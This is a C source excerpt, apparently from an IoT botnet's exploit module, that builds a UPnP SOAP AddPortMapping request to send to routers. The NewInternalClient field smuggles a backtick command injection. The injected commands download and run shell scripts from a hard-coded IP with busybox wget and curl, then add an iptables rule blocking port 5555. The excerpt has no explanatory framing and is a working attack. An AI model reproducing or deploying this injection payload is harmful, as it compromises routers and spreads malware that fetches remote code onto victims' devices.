            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if(err == 0 && ret == 0)
                {
                    if(conn->state == EXPLOIT_SC_EXPLOIT_STAGE2)
                    {
						...
						#endif
						util_strcpy(conn->payload_buf, "POST /UD/?9 HTTP/1.1\r\nUser-Agent: OSIRIS\r\nContent-Type: text/xml\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47449</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`>busybox wget http://74.201.28.102/w.sh; sh w.sh; curl http://74.201.28.102/c.sh; sh c.sh; wget http://74.201.28.102/wget.sh; sh wget.sh; curl http://74.201.28.102/wget.sh; sh wget.sh; busybox wget http://74.201.28.102/wget.sh; sh wget.sh; busybox curl http://74.201.28.102/wget.sh; sh wget.sh; iptables -A INPUT -p tcp --destination-port 5555 -j DROP`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>");
